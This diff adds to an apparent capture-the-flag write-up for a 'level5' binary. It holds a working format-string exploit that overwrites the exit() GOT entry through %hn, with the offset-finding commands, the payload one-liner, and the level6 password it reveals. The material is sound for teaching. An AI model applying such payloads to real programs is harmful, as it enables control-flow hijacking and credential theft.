@@ -111,3 +111,23 @@ OFFSET   TYPE              VALUE
 08049838 R_386_JUMP_SLOT   exit
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
+|address | fucntion|
+|--------|---------|
+|0x08049838|`exit()`|
+|0x080484a4| `o()`|
+
+If we pay attention above we can see that only the two right most bytes are differents, so what we need to do is change those two bytes. <br>
+From the `printf()` main page we know that: *An optional length modifier, that specifies the size of the argument.* Here we will be using `%h` that represents a *short* or a *half-word*
+
+if we convert those two bytes from hex to decimal with the help of [hex-to-int](https://www.rapidtables.com/convert/number/hex-to-decimal.html) we get `0x84a4 = 33956`.<br> So lets get the **offset** as before
+```
+~$ echo "AAAA %x %x %x %x %x" | ./level5
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+```
+So here we see can our __offset__ is again at position 4th and with the `%h` for the *short* it will be `%4\$hn` so far we have all we need to create our *format string exploit:* <br>
+`(python -c "print('\x38\x98\x04\x08' + '%33952d%4\$hn')"; cat -) | ./level5` <br>
+Now all we need to do is get the token:
+```
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
